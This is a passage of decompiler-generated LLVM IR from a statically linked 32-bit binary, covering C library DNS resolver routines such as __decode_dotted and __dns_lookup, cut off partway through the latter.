dec_label_pc_8064823:                             ; preds = %dec_label_pc_8064839, %dec_label_pc_8064832
  %v1_8064826 = add i32 %v0_8064826, 8
  store i32 %v1_8064826, i32* @ebx, align 4
  %v1_806482a = call i32 @free(i32 %v3_8064832)
  %v0_8064832.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064832

dec_label_pc_8064832:                             ; preds = %entry, %dec_label_pc_8064823
  %v0_8064826 = phi i32 [ %tmp3, %entry ], [ %v0_8064832.pre, %dec_label_pc_8064823 ]
  %v1_8064832 = add i32 %v0_8064826, 4
  %v2_8064832 = inttoptr i32 %v1_8064832 to i32*
  %v3_8064832 = load i32, i32* %v2_8064832, align 4
  %v1_8064835 = icmp eq i32 %v3_8064832, 0
  %v1_8064837 = icmp eq i1 %v1_8064835, false
  br i1 %v1_8064837, label %dec_label_pc_8064823, label %dec_label_pc_8064839

dec_label_pc_8064839:                             ; preds = %dec_label_pc_8064832
  %v1_8064839 = inttoptr i32 %v0_8064826 to i32*
  %v2_8064839 = load i32, i32* %v1_8064839, align 4
  %v3_8064839 = icmp eq i32 %v2_8064839, 0
  %v1_806483c = icmp eq i1 %v3_8064839, false
  br i1 %v1_806483c, label %dec_label_pc_8064823, label %dec_label_pc_806483e

dec_label_pc_806483e:                             ; preds = %dec_label_pc_8064839
  %v0_806483e = load i32, i32* @esi, align 4
  %v2_8064843 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8064843, i32* @ebx, align 4
  store i32 %v0_8064816, i32* @esi, align 4
  %v1_8064845 = call i32 @free(i32 %v0_806483e)
  ret i32 %v1_8064845

; uselistorder directives
  uselistorder i32 %v3_8064832, { 1, 0 }
  uselistorder i32 %v0_8064826, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8064832, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_806484d = load i32, i32* @edi, align 4
  %v0_806484e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8064857 = icmp eq i32 %arg1, 0
  br i1 %v4_8064857, label %dec_label_pc_8064918, label %dec_label_pc_8064862

dec_label_pc_8064862:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80649002740 = add i32 %arg2, %arg1
  %v3_80649002841 = inttoptr i32 %v2_80649002740 to i8*
  %v4_80649002942 = load i8, i8* %v3_80649002841, align 1
  %v1_80649043144 = icmp eq i8 %v4_80649002942, 0
  %v1_80649063245 = icmp eq i1 %v1_80649043144, false
  br i1 %v1_80649063245, label %dec_label_pc_8064870.lr.ph, label %dec_label_pc_806490c

dec_label_pc_8064870:                             ; preds = %dec_label_pc_8064870.lr.ph, %dec_label_pc_8064889
  %v0_806487a = phi i32 [ %v0_806487a.pre, %dec_label_pc_8064870.lr.ph ], [ %v4_8064894, %dec_label_pc_8064889 ]
  %v8_806487038 = phi i1 [ %v8_80648703350, %dec_label_pc_8064870.lr.ph ], [ true, %dec_label_pc_8064889 ]
  %v5_806490037.in = phi i8 [ %v5_80649003049.in, %dec_label_pc_8064870.lr.ph ], [ %v4_8064900, %dec_label_pc_8064889 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8064870.lr.ph ], [ 0, %dec_label_pc_8064889 ]
  %v0_806487735 = phi i32 [ %v0_8064877.ph46, %dec_label_pc_8064870.lr.ph ], [ %v2_80648a3, %dec_label_pc_8064889 ]
  %v5_806490037 = zext i8 %v5_806490037.in to i32
  %v1_8064877 = add i32 %v0_806487735, 1
  store i32 %v1_8064877, i32* @esi, align 4
  %v3_806487a = select i1 %v8_806487038, i32 2, i32 1
  %v4_806487a = add i32 %v3_806487a, %v0_806487a
  store i32 %v4_806487a, i32* %ebp.global-to-local, align 4
  %v1_806487d = and i32 %v5_806490037, 192
  %v6_8064882 = icmp eq i32 %v1_806487d, 192
  %v1_8064887 = icmp eq i1 %v6_8064882, false
  br i1 %v1_8064887, label %dec_label_pc_80648ac, label %dec_label_pc_8064889

dec_label_pc_8064889:                             ; preds = %dec_label_pc_8064870
  %v4_8064894 = add i32 %v3_806487a, %v4_806487a
  store i32 %v4_8064894, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_806490037.in, 64
  %v1_8064897 = zext i8 %tmp to i32
  %v2_806489a = add i32 %v1_8064877, %arg1
  %v3_806489a = inttoptr i32 %v2_806489a to i8*
  %v4_806489a = load i8, i8* %v3_806489a, align 1
  %v5_806489a = zext i8 %v4_806489a to i32
  %v2_806489e = mul nuw nsw i32 %v1_8064897, 256
  %v2_80648a3 = or i32 %v5_806489a, %v2_806489e
  store i32 %v2_80648a3, i32* @edx, align 4
  store i32 %v1_80648c9.ph47, i32* @ecx, align 4
  %v2_8064900 = add i32 %v2_80648a3, %arg1
  %v3_8064900 = inttoptr i32 %v2_8064900 to i8*
  %v4_8064900 = load i8, i8* %v3_8064900, align 1
  %v1_8064904 = icmp eq i8 %v4_8064900, 0
  %v1_8064906 = icmp eq i1 %v1_8064904, false
  br i1 %v1_8064906, label %dec_label_pc_8064870, label %dec_label_pc_806490c

dec_label_pc_80648ac:                             ; preds = %dec_label_pc_8064870
  %v2_80648ac = add i32 %v5_806490037, %v1_80648c9.ph47
  %v1_80648b5 = add i32 %v2_80648ac, 1
  store i32 %v1_80648b5, i32* @edi, align 4
  %v10_80648b6 = icmp ult i32 %v1_80648b5, %arg4
  %v1_80648ba = icmp eq i1 %v10_80648b6, false
  br i1 %v1_80648ba, label %dec_label_pc_8064918, label %dec_label_pc_80648bc

dec_label_pc_80648bc:                             ; preds = %dec_label_pc_80648ac
  %v2_80648c2 = add i32 %v1_8064877, %arg1
  %v2_80648c9 = add i32 %v1_80648c9.ph47, %arg3
  %v3_80648cc = inttoptr i32 %v2_80648c9 to i16*
  %v4_80648cc = call i32 @memcpy(i16* %v3_80648cc, i32 %v2_80648c2, i32 %v5_806490037)
  %v0_80648d4 = load i32, i32* @esi, align 4
  %v2_80648d4 = add i32 %v0_80648d4, %v5_806490037
  store i32 %v2_80648d4, i32* @edx, align 4
  br i1 %v8_806487038, label %dec_label_pc_80648e0, label %dec_label_pc_80648de

dec_label_pc_80648de:                             ; preds = %dec_label_pc_80648bc
  %v0_80648de = load i32, i32* %ebp.global-to-local, align 4
  %v2_80648de = add i32 %v0_80648de, %v5_806490037
  store i32 %v2_80648de, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80648e0

dec_label_pc_80648e0:                             ; preds = %dec_label_pc_80648bc, %dec_label_pc_80648de
  %v4_80648f7 = add i32 %v2_80648ac, %arg3
  %v5_80648f7 = inttoptr i32 %v4_80648f7 to i8*
  store i8 46, i8* %v5_80648f7, align 1
  %v0_80648fa.pre = load i32, i32* @edi, align 4
  %v1_8064900.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80648fa.pre, i32* @ecx, align 4
  %v2_806490027 = add i32 %v1_8064900.pre.pre, %arg1
  %v3_806490028 = inttoptr i32 %v2_806490027 to i8*
  %v4_806490029 = load i8, i8* %v3_806490028, align 1
  %v1_806490431 = icmp eq i8 %v4_806490029, 0
  %v1_806490632 = icmp eq i1 %v1_806490431, false
  %v8_806487033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_806487a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_806490632, label %dec_label_pc_8064870.lr.ph, label %dec_label_pc_806490c

dec_label_pc_8064870.lr.ph:                       ; preds = %dec_label_pc_80648e0, %dec_label_pc_8064862
  %v0_806487a.pre = phi i32 [ 0, %dec_label_pc_8064862 ], [ %v0_806487a.pre.pre, %dec_label_pc_80648e0 ]
  %v8_80648703350 = phi i1 [ false, %dec_label_pc_8064862 ], [ %v8_806487033, %dec_label_pc_80648e0 ]
  %v5_80649003049.in = phi i8 [ %v4_80649002942, %dec_label_pc_8064862 ], [ %v4_806490029, %dec_label_pc_80648e0 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8064862 ], [ %stack_var_-17.136, %dec_label_pc_80648e0 ]
  %v1_80648c9.ph47 = phi i32 [ 0, %dec_label_pc_8064862 ], [ %v0_80648fa.pre, %dec_label_pc_80648e0 ]
  %v0_8064877.ph46 = phi i32 [ %arg2, %dec_label_pc_8064862 ], [ %v1_8064900.pre.pre, %dec_label_pc_80648e0 ]
  br label %dec_label_pc_8064870

dec_label_pc_806490c:                             ; preds = %dec_label_pc_80648e0, %dec_label_pc_8064889, %dec_label_pc_8064862
  %v0_8064911 = phi i32 [ 0, %dec_label_pc_8064862 ], [ %v4_8064894, %dec_label_pc_8064889 ], [ %v0_806487a.pre.pre, %dec_label_pc_80648e0 ]
  %v8_8064870.lcssa = phi i1 [ false, %dec_label_pc_8064862 ], [ true, %dec_label_pc_8064889 ], [ %v8_806487033, %dec_label_pc_80648e0 ]
  %v2_8064913 = zext i1 %v8_8064870.lcssa to i32
  %v3_8064913 = add i32 %v0_8064911, 1
  %v4_8064913 = add i32 %v3_8064913, %v2_8064913
  br label %dec_label_pc_806491b

dec_label_pc_8064918:                             ; preds = %dec_label_pc_80648ac, %entry
  br label %dec_label_pc_806491b

dec_label_pc_806491b:                             ; preds = %dec_label_pc_806490c, %dec_label_pc_8064918
  %storemerge = phi i32 [ -1, %dec_label_pc_8064918 ], [ %v4_8064913, %dec_label_pc_806490c ]
  store i32 %v0_806484e, i32* @esi, align 4
  store i32 %v0_806484d, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80648c9.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8064900, { 1, 0 }
  uselistorder i32 %v2_80648a3, { 0, 2, 1 }
  uselistorder i32 %v4_8064894, { 0, 2, 1 }
  uselistorder i32 %v5_806490037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 46, { 6, 8, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i1 true, { 1, 10, 15, 12, 14, 2, 3, 4, 5, 6, 7, 13, 11, 0, 8, 9 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_806491b, { 1, 0 }
  uselistorder label %dec_label_pc_80648e0, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp37 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_806493a = call i32 @malloc(i32 512)
  store i32 %v2_806493a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_806493a, i32* @ebp, align 4
  %v2_8064948 = call i32 @malloc(i32 1025)
  store i32 %v2_8064948, i32* %eax.global-to-local, align 4
  %v12_8064951 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8064954 = icmp eq i32 %v2_806493a, 0
  br i1 %v1_8064954, label %dec_label_pc_8064fcd, label %dec_label_pc_806495c

dec_label_pc_806495c:                             ; preds = %entry
  %v1_806495c = icmp eq i32 %v2_8064948, 0
  br i1 %v1_806495c, label %dec_label_pc_8064fcd, label %dec_label_pc_8064964

dec_label_pc_8064964:                             ; preds = %dec_label_pc_806495c
  %v5_8064964 = icmp eq i32 %arg2, 0
  br i1 %v5_8064964, label %dec_label_pc_8064fcd, label %dec_label_pc_8064972

dec_label_pc_8064972:                             ; preds = %dec_label_pc_8064964
  %v4_8064972 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8064972, i32* %eax.global-to-local, align 4
  %v2_8064979 = load i8, i8* %arg1, align 1
  %v3_8064979 = icmp eq i8 %v2_8064979, 0
  br i1 %v3_8064979, label %dec_label_pc_8064fcd, label %dec_label_pc_8064982

dec_label_pc_8064982:                             ; preds = %dec_label_pc_8064972
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8064986 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8064986, i32* %eax.global-to-local, align 4
  store i32 %v4_8064972, i32* %edx.global-to-local, align 4
  %v2_80649a9 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80649a9, i32* @ebx, align 4
  %tmp50 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp50, i8** %stack_var_-252, align 4
  %v6_80649b1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 134585853, i32 ptrtoint (i8** @global_var_807d27c.822 to i32))
  store i32 %v6_80649b1, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_807d27c.822 to i8*), i8** %stack_var_-252, align 4
  %v2_80649bd = call i32 @pthread_mutex_lock(i32 ptrtoint (i8** @global_var_807d27c.822 to i32))
  %v0_80649c2 = load i64, i64* @global_var_807d294.823, align 8
  %v1_80649c2 = trunc i64 %v0_80649c2 to i32
  %v1_80649c7 = ashr i32 %v1_80649c2, 31
  %v6_80649c8 = and i64 %v0_80649c2, 4294967295
  %v8_80649c8 = zext i32 %v1_80649c7 to i64
  %v9_80649c8 = mul nuw i64 %v8_80649c8, 4294967296
  %v10_80649c8 = or i64 %v9_80649c8, %v6_80649c8
  %v14_80649c8 = srem i64 %v10_80649c8, %tmp37
  %v15_80649c8 = trunc i64 %v14_80649c8 to i32
  %v0_80649cf = load i16, i16* @global_var_807489c.824, align 4
  %v2_80649de = load i8*, i8** %stack_var_-252, align 4
  %v3_80649de = ptrtoint i8* %v2_80649de to i32
  store i32 %v3_80649de, i32* %eax.global-to-local, align 4
  store i32 134585853, i32* %edx.global-to-local, align 4
  store i8* %tmp50, i8** %stack_var_-252, align 4
  %v4_80649e3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-52, i32 1)
  store i32 %v4_80649e3, i32* %eax.global-to-local, align 4
  %v3_8064a27 = sext i16 %v0_80649cf to i32
  %v4_8064b8a = inttoptr i32 %v15_80649c8 to i8*
  %v1_8064fa891 = add i32 %v12_8064951, 28
  %v2_8064fa892 = inttoptr i32 %v1_8064fa891 to i32*
  %v3_8064fa893 = load i32, i32* %v2_8064fa892, align 4
  %tmp126 = icmp ult i32 %v3_8064fa893, 3
  br i1 %tmp126, label %dec_label_pc_8064a08, label %dec_label_pc_8064fcd

dec_label_pc_8064a08:                             ; preds = %dec_label_pc_8064982, %dec_label_pc_8064fa8.backedge
  %v0_8064a0f99 = phi i32 [ %v0_8064fa8.pre, %dec_label_pc_8064fa8.backedge ], [ %v12_8064951, %dec_label_pc_8064982 ]
  %v1_8064a08 = add i32 %v0_8064a0f99, 20
  %v2_8064a08 = inttoptr i32 %v1_8064a08 to i32*
  %v3_8064a08 = load i32, i32* %v2_8064a08, align 4
  %v13_8064a08 = icmp eq i32 %v3_8064a08, -1
  br i1 %v13_8064a08, label %dec_label_pc_8064a08.dec_label_pc_8064a1e_crit_edge, label %dec_label_pc_8064a0f

dec_label_pc_8064a08.dec_label_pc_8064a1e_crit_edge: ; preds = %dec_label_pc_8064a08
  %v0_8064a1e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064a1e

dec_label_pc_8064a0f:                             ; preds = %dec_label_pc_8064a08
  %v3_8064a12 = load i32, i32* %v2_8064a08, align 4
  %v5_8064a12 = add i32 %v0_8064a0f99, -16
  %v6_8064a12 = inttoptr i32 %v5_8064a12 to i32*
  store i32 %v3_8064a12, i32* %v6_8064a12, align 4
  %v1_8064a16 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8064a16, i32* %eax.global-to-local, align 4
  %v0_8064a1b = load i32, i32* @esp, align 4
  %v1_8064a1b = add i32 %v0_8064a1b, 16
  br label %dec_label_pc_8064a1e

dec_label_pc_8064a1e:                             ; preds = %dec_label_pc_8064a08.dec_label_pc_8064a1e_crit_edge, %dec_label_pc_8064a0f
  %v1_8064a1e = phi i32 [ %v0_8064a0f99, %dec_label_pc_8064a08.dec_label_pc_8064a1e_crit_edge ], [ %v1_8064a1b, %dec_label_pc_8064a0f ]
  %v0_8064a1e = phi i32 [ %v0_8064a1e.pre, %dec_label_pc_8064a08.dec_label_pc_8064a1e_crit_edge ], [ %v1_8064a16, %dec_label_pc_8064a0f ]
  %v2_8064a1e = add i32 %v1_8064a1e, -4
  %v3_8064a1e = inttoptr i32 %v2_8064a1e to i32*
  store i32 %v0_8064a1e, i32* %v3_8064a1e, align 4
  %v1_8064a1f = add i32 %v1_8064a1e, -8
  %v2_8064a1f = inttoptr i32 %v1_8064a1f to i32*
  store i32 512, i32* %v2_8064a1f, align 4
  %v1_8064a24 = add i32 %v1_8064a1e, -12
  %v2_8064a24 = inttoptr i32 %v1_8064a24 to i32*
  store i32 0, i32* %v2_8064a24, align 4
  %v2_8064a26 = add i32 %v1_8064a1e, -16
  %v3_8064a26 = inttoptr i32 %v2_8064a26 to i32*
  store i32 %v2_806493a, i32* %v3_8064a26, align 4
  %v5_8064a27 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064a27, i32* %eax.global-to-local, align 4
  %v0_8064a2c = load i32, i32* @esp, align 4
  %v1_8064a2f = add i32 %v0_8064a2c, 8
  %v2_8064a2f = inttoptr i32 %v1_8064a2f to i32*
  store i32 48, i32* %v2_8064a2f, align 4
  %v1_8064a31 = add i32 %v0_8064a2c, 4
  %v2_8064a31 = inttoptr i32 %v1_8064a31 to i32*
  store i32 0, i32* %v2_8064a31, align 4
  %v1_8064a33 = add i32 %v0_8064a2c, 84
  store i32 %v1_8064a33, i32* @ebx, align 4
  %v3_8064a37 = inttoptr i32 %v0_8064a2c to i32*
  store i32 %v1_8064a33, i32* %v3_8064a37, align 4
  %v5_8064a38 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064a38, i32* %eax.global-to-local, align 4
  %v0_8064a3d = load i32, i32* @esp, align 4
  %v1_8064a3d = add i32 %v0_8064a3d, 60
  %v2_8064a3d = inttoptr i32 %v1_8064a3d to i32*
  %v3_8064a3d = load i32, i32* %v2_8064a3d, align 4
  store i32 %v3_8064a3d, i32* %eax.global-to-local, align 4
  %v1_8064a41 = add i32 %v0_8064a3d, 116
  %v2_8064a41 = inttoptr i32 %v1_8064a41 to i32*
  store i32 1, i32* %v2_8064a41, align 4
  %v0_8064a49 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064a49 = add i32 %v0_8064a49, 1
  %v0_8064a4a = load i32, i32* @esp, align 4
  %v1_8064a4a = add i32 %v0_8064a4a, 104
  %v2_8064a4a = inttoptr i32 %v1_8064a4a to i32*
  store i32 1, i32* %v2_8064a4a, align 4
  %v1_8064a52 = urem i32 %v1_8064a49, 65536
  store i32 %v1_8064a52, i32* %eax.global-to-local, align 4
  %v1_8064a57 = load i32, i32* @esp, align 4
  %v2_8064a57 = add i32 %v1_8064a57, 60
  %v3_8064a57 = inttoptr i32 %v2_8064a57 to i32*
  store i32 %v1_8064a52, i32* %v3_8064a57, align 4
  %v0_8064a5b = load i32, i32* %eax.global-to-local, align 4
  %v1_8064a5b = load i32, i32* @esp, align 4
  %v2_8064a5b = add i32 %v1_8064a5b, 84
  %v3_8064a5b = inttoptr i32 %v2_8064a5b to i32*
  store i32 %v0_8064a5b, i32* %v3_8064a5b, align 4
  %v0_8064a5f = load i32, i32* @esp, align 4
  %v1_8064a62 = add i32 %v0_8064a5f, 8
  %v2_8064a62 = inttoptr i32 %v1_8064a62 to i32*
  store i32 512, i32* %v2_8064a62, align 4
  %v2_8064a67 = add i32 %v0_8064a5f, 4
  %v3_8064a67 = inttoptr i32 %v2_8064a67 to i32*
  store i32 %v2_806493a, i32* %v3_8064a67, align 4
  %v0_8064a68 = load i32, i32* @ebx, align 4
  %v3_8064a68 = inttoptr i32 %v0_8064a5f to i32*
  store i32 %v0_8064a68, i32* %v3_8064a68, align 4
  %v0_8064a69 = call i32 @__encode_header()
  store i32 %v0_8064a69, i32* %eax.global-to-local, align 4
  %v0_8064a6e = load i32, i32* @esp, align 4
  store i32 %v0_8064a69, i32* @ebx, align 4
  %v2_8064a73 = icmp slt i32 %v0_8064a69, 0
  br i1 %v2_8064a73, label %dec_label_pc_8064fcd, label %dec_label_pc_8064a7b

dec_label_pc_8064a7b:                             ; preds = %dec_label_pc_8064a1e
  %v2_8064a7b = add i32 %v0_8064a6e, 12
  %v3_8064a7b = inttoptr i32 %v2_8064a7b to i32*
  store i32 %v0_8064a69, i32* %v3_8064a7b, align 4
  %v1_8064a7c = add i32 %v0_8064a6e, 8
  %v2_8064a7c = inttoptr i32 %v1_8064a7c to i32*
  store i32 1025, i32* %v2_8064a7c, align 4
  %v1_8064a81 = add i32 %v0_8064a6e, 256
  %v2_8064a81 = inttoptr i32 %v1_8064a81 to i32*
  %v3_8064a81 = load i32, i32* %v2_8064a81, align 4
  %v5_8064a81 = add i32 %v0_8064a6e, 4
  %v6_8064a81 = inttoptr i32 %v5_8064a81 to i32*
  store i32 %v3_8064a81, i32* %v6_8064a81, align 4
  %v1_8064a88 = add i32 %v0_8064a6e, 28
  %v2_8064a88 = inttoptr i32 %v1_8064a88 to i32*
  %v3_8064a88 = load i32, i32* %v2_8064a88, align 4
  %v6_8064a88 = inttoptr i32 %v0_8064a6e to i32*
  store i32 %v3_8064a88, i32* %v6_8064a88, align 4
  %v5_8064a8c = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80649c8, i32 %v3_8064a27)
  %v0_8064a91 = load i32, i32* @esp, align 4
  %v1_8064a94 = add i32 %v0_8064a91, 8
  %v2_8064a94 = inttoptr i32 %v1_8064a94 to i32*
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %v2_8064a94, align 4
  %v1_8064a99 = add i32 %v0_8064a91, 4
  %v2_8064a99 = inttoptr i32 %v1_8064a99 to i32*
  store i32 134585853, i32* %v2_8064a99, align 4
  %v1_8064a9e = add i32 %v0_8064a91, 200
  store i32 %v1_8064a9e, i32* %eax.global-to-local, align 4
  %v3_8064aa5 = inttoptr i32 %v0_8064a91 to i32*
  store i32 %v1_8064a9e, i32* %v3_8064aa5, align 4
  %v5_8064aa6 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064aa6, i32* %eax.global-to-local, align 4
  %v0_8064aab = load i32, i32* @esp, align 4
  %v1_8064aab = inttoptr i32 %v0_8064aab to i32*
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %v1_8064aab, align 4
  %v1_8064ab2 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8064ab2, i32* %eax.global-to-local, align 4
  %v0_8064ab7 = load i32, i32* @esp, align 4
  %v1_8064ab7 = add i32 %v0_8064ab7, 56
  %v2_8064ab7 = inttoptr i32 %v1_8064ab7 to i32*
  %v3_8064ab7 = load i32, i32* %v2_8064ab7, align 4
  store i32 %v3_8064ab7, i32* %edx.global-to-local, align 4
  %v1_8064abb = add i32 %v0_8064ab7, 268
  %v2_8064abb = inttoptr i32 %v1_8064abb to i32*
  %v3_8064abb = load i32, i32* %v2_8064abb, align 4
  store i32 %v3_8064abb, i32* %eax.global-to-local, align 4
  %v2_8064ac2 = mul i32 %v3_8064ab7, 4
  %v3_8064ac2 = add i32 %v3_8064abb, %v2_8064ac2
  %v4_8064ac2 = inttoptr i32 %v3_8064ac2 to i32*
  %v5_8064ac2 = load i32, i32* %v4_8064ac2, align 4
  store i32 %v5_8064ac2, i32* %edx.global-to-local, align 4
  %v2_8064ac5 = add i32 %v0_8064ab7, 48
  %v3_8064ac5 = inttoptr i32 %v2_8064ac5 to i32*
  store i32 %v5_8064ac2, i32* %v3_8064ac5, align 4
  %v0_8064ac9 = load i32, i32* @esp, align 4
  %v1_8064ac9 = add i32 %v0_8064ac9, 16
  %v1_8064acc = add i32 %v0_8064ac9, 52
  %v2_8064acc = inttoptr i32 %v1_8064acc to i32*
  %v3_8064acc = load i32, i32* %v2_8064acc, align 4
  %v5_8064acc = icmp slt i32 %v3_8064acc, 0
  br i1 %v5_8064acc, label %dec_label_pc_8064a7b.dec_label_pc_8064b12_crit_edge, label %dec_label_pc_8064ad3

dec_label_pc_8064a7b.dec_label_pc_8064b12_crit_edge: ; preds = %dec_label_pc_8064a7b
  %v0_8064b12.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b12

dec_label_pc_8064ad3:                             ; preds = %dec_label_pc_8064a7b
  store i32 %v3_8064acc, i32* %eax.global-to-local, align 4
  %v1_8064ad7 = load i32, i32* @global_var_807ea64.825, align 4
  %v2_8064ad7 = sub i32 %v3_8064acc, %v1_8064ad7
  %v8_8064ad7 = xor i32 %v1_8064ad7, %v3_8064acc
  %v9_8064ad7 = xor i32 %v2_8064ad7, %v3_8064acc
  %v10_8064ad7 = and i32 %v9_8064ad7, %v8_8064ad7
  %v11_8064ad7 = icmp slt i32 %v10_8064ad7, 0
  %v13_8064ad7 = icmp slt i32 %v2_8064ad7, 0
  %v2_8064add = icmp eq i1 %v13_8064ad7, %v11_8064ad7
  br i1 %v2_8064add, label %dec_label_pc_8064b12, label %dec_label_pc_8064adf

dec_label_pc_8064adf:                             ; preds = %dec_label_pc_8064ad3
  %v2_8064adf = add i32 %v0_8064ac9, 12
  %v3_8064adf = inttoptr i32 %v2_8064adf to i32*
  store i32 %v3_8064acc, i32* %v3_8064adf, align 4
  %v1_8064ae0 = add i32 %v0_8064ac9, 8
  %v2_8064ae0 = inttoptr i32 %v1_8064ae0 to i32*
  store i32 1025, i32* %v2_8064ae0, align 4
  %v1_8064ae5 = add i32 %v0_8064ac9, 4
  %v2_8064ae5 = inttoptr i32 %v1_8064ae5 to i32*
  store i32 ptrtoint (i32* @global_var_806d7c6.826 to i32), i32* %v2_8064ae5, align 4
  %v1_8064aea = add i32 %v0_8064ac9, 28
  %v2_8064aea = inttoptr i32 %v1_8064aea to i32*
  %v3_8064aea = load i32, i32* %v2_8064aea, align 4
  %v6_8064aea = inttoptr i32 %v0_8064ac9 to i32*
  store i32 %v3_8064aea, i32* %v6_8064aea, align 4
  %v0_8064aee = call i32 @__GI_strncat()
  store i32 %v0_8064aee, i32* %eax.global-to-local, align 4
  %v0_8064af3 = load i32, i32* @esp, align 4
  %v1_8064af6 = add i32 %v0_8064af3, 8
  %v2_8064af6 = inttoptr i32 %v1_8064af6 to i32*
  store i32 1025, i32* %v2_8064af6, align 4
  %v1_8064afb = add i32 %v0_8064af3, 52
  %v2_8064afb = inttoptr i32 %v1_8064afb to i32*
  %v3_8064afb = load i32, i32* %v2_8064afb, align 4
  store i32 %v3_8064afb, i32* %edx.global-to-local, align 4
  %v1_8064aff = mul i32 %v3_8064afb, 4
  %v2_8064aff = add i32 %v1_8064aff, 134736452
  %v3_8064aff = inttoptr i32 %v2_8064aff to i32*
  %v4_8064aff = load i32, i32* %v3_8064aff, align 4
  %v6_8064aff = add i32 %v0_8064af3, 4
  %v7_8064aff = inttoptr i32 %v6_8064aff to i32*
  store i32 %v4_8064aff, i32* %v7_8064aff, align 4
  %v1_8064b06 = add i32 %v0_8064af3, 28
  %v2_8064b06 = inttoptr i32 %v1_8064b06 to i32*
  %v3_8064b06 = load i32, i32* %v2_8064b06, align 4
  %v6_8064b06 = inttoptr i32 %v0_8064af3 to i32*
  store i32 %v3_8064b06, i32* %v6_8064b06, align 4
  %v0_8064b0a = call i32 @__GI_strncat()
  store i32 %v0_8064b0a, i32* %eax.global-to-local, align 4
  %v0_8064b0f = load i32, i32* @esp, align 4
  %v1_8064b0f = add i32 %v0_8064b0f, 16
  br label %dec_label_pc_8064b12

dec_label_pc_8064b12:                             ; preds = %dec_label_pc_8064a7b.dec_label_pc_8064b12_crit_edge, %dec_label_pc_8064ad3, %dec_label_pc_8064adf
  %v1_8064b12 = phi i32 [ %v1_8064ac9, %dec_label_pc_8064a7b.dec_label_pc_8064b12_crit_edge ], [ %v1_8064ac9, %dec_label_pc_8064ad3 ], [ %v1_8064b0f, %dec_label_pc_8064adf ]
  %v0_8064b12 = phi i32 [ %v0_8064b12.pre, %dec_label_pc_8064a7b.dec_label_pc_8064b12_crit_edge ], [ %v3_8064acc, %dec_label_pc_8064ad3 ], [ %v0_8064b0a, %dec_label_pc_8064adf ]
  %v2_8064b12 = add i32 %v1_8064b12, -4
  %v3_8064b12 = inttoptr i32 %v2_8064b12 to i32*
  store i32 %v0_8064b12, i32* %v3_8064b12, align 4
  %v0_8064b13 = load i32, i32* %eax.global-to-local, align 4
  %v2_8064b13 = add i32 %v1_8064b12, -8
  %v3_8064b13 = inttoptr i32 %v2_8064b13 to i32*
  store i32 %v0_8064b13, i32* %v3_8064b13, align 4
  %v1_8064b14 = add i32 %v1_8064b12, -12
  %v2_8064b14 = inttoptr i32 %v1_8064b14 to i32*
  store i32 1, i32* %v2_8064b14, align 4
  %v1_8064b16 = add i32 %v1_8064b12, 184
  store i32 %v1_8064b16, i32* %eax.global-to-local, align 4
  %v2_8064b1d = add i32 %v1_8064b12, -16
  %v3_8064b1d = inttoptr i32 %v2_8064b1d to i32*
  store i32 %v1_8064b16, i32* %v3_8064b1d, align 4
